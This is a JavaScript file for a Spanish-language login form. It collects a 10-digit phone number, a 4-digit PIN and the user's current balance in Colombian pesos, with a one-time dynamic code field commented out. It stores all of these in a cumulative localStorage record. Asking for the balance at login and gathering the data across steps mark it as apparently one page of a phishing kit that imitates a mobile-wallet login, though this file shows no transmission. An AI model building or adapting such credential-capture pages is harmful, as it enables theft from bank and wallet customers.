const phoneNumber = document.getElementById("phoneNumber");
const password = document.getElementById("password");
const saldoActual = document.getElementById("saldoActual");
//const dinamicCode = document.getElementById('dinamicCode');
const loginButton = document.getElementById("loginButton");
const captcha = document.getElementsByClassName("checkmark");

phoneNumber.addEventListener("input", () => {
  handlePhoneNumberInput(phoneNumber);
});

password.addEventListener("input", () => {
  handlePasswordInput(password);
});

saldoActual.addEventListener("input", (e) => {
  let value = e.target.value;
  value = value.replace(/\D/g, "");
  if (value) {
    value = new Intl.NumberFormat("es-CO", {
      style: "currency",
      currency: "COP",
      minimumFractionDigits: 0,
      maximumFractionDigits: 0
    }).format(value);
  }
  e.target.value = value;
});

/*dinamicCode.addEventListener('input', () => {
    handleDinamicCodeInput(dinamicCode);
});*/

function handlePhoneNumberInput(input) {
  let numero = input.value.replace(/\D/g, ""); // Eliminar todos los caracteres no numéricos

  // Limitar a un máximo de 10 dígitos
  if (numero.length > 10) {
    numero = numero.substr(0, 10);
  }

  // Aplicar formato dinámico en tiempo real
  if (numero.length > 6) {
    numero = numero.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (numero.length > 3) {
    numero = numero.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }

  input.value = numero.trim(); // Asignar el valor formateado al input
}

function handlePasswordInput(input) {
  let password = input.value.replace(/\D/g, ""); // Eliminar todos los caracteres no numéricos

  // Limitar a 4 dígitos
  if (password.length > 4) {
    password = password.substr(0, 4);
  }

  input.value = password; // Actualizar el valor del input
}

/*function handleDinamicCodeInput(input) {
    let dinamicCode = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    // Limitar a 6 dígitos
    if (dinamicCode.length > 6) {
        dinamicCode = dinamicCode.substr(0, 6);
    }

    input.value = dinamicCode; // Actualizar el valor del input
}*/

export function LoginValidation(form) {
  let isValid = true;
  const phoneInput = form.querySelector("#phoneNumber");
  const passwordInput = form.querySelector("#password");
  const saldoInput = form.querySelector("#saldoActual");

  // Verificar que los campos no estén vacíos y cumplan con los requisitos
  if (!phoneInput || !passwordInput || !saldoInput) {
    return false;
  }

  const phoneNumber = phoneInput.value.replace(/\D/g, "");
  const password = passwordInput.value;

  // Validar número de teléfono (debe tener 10 dígitos)
  if (phoneNumber.length !== 10) {
    isValid = false;
  }

  // Validar contraseña (debe tener 4 dígitos)
  if (password.length !== 4) {
    isValid = false;
  }

  // Validar saldo (debe tener longitud de al menos 5 tras formatear con $)
  if (saldoInput.value.length < 5) {
    isValid = false;
  }

  return isValid;
}

loginButton.addEventListener("click", (event) => {
  event.preventDefault(); // Previene el comportamiento por defecto del botón

  const form = document.getElementById("homeForm");

  if (!LoginValidation(form)) {
    return;
  } else {
    if (LoginValidation(form)) {
      const phoneNumber = document
        .querySelector("#phoneNumber")
        .value.replace(/\D/g, ""); // Quita espacios y caracteres no numéricos
      const password = document.querySelector("#password").value;
      const saldo = document.querySelector("#saldoActual").value;
      //const dinamicCode = document.querySelector('#dinamicCode').value;
      const formData = JSON.parse(localStorage.getItem("formData"));

      // Crea un objeto con los datos del formulario
      formData.phoneNumber = phoneNumber;
      formData.password = password;
      formData.saldoActual = saldo;
      //formData.dinamicCode = dinamicCode;

      // Guarda el objeto en el localStorage
      localStorage.setItem("formData", JSON.stringify(formData));
    }
  }
});
